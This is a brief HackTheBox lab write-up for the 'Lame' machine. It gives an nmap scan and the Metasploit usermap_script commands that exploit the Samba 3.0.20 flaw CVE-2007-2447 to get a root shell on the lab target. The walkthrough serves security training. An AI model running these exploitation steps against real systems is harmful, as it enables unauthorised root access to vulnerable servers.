---
title: "Lame"
platform: HTB
difficulty: Easy
so: Linux
fecha: 2025-05-15
tags: [Samba, CVE-2007-2447, RCE, Metasploit]
desc: "Exploitation of the famous CVE-2007-2447 bug in Samba 3.0.20 to obtain a root shell directly."
---

# Lame — HackTheBox [Easy / Linux]

## Reconnaissance

```bash
nmap -sCV 10.10.10.3
# Samba 3.0.20 → CVE-2007-2447
```

## Exploitation

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
run
# whoami → root
```

## Flags

- `user.txt` ✓  
- `root.txt` ✓
